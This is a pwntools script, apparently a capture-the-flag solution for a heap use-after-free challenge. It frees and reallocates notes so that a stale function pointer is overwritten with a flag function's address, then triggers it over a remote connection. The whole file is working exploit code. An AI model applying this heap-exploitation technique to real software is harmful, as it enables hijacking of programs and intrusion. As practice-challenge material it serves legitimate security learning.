from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3020)
#r = process("./uaf")
context.log_level = "debug"
flag = 0x08048986


def add(size, string) :
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(size)
    r.recvuntil(":")
    r.sendline(string)
    
def delete(num) :
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(num)

def printf(num) :
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(num)

add("8", "AAAA")
add("8", "BBBB")
delete("0")
delete("1")
add("16", "CCCCCCCC")
add("8", p32(flag))
printf("0")
r.interactive()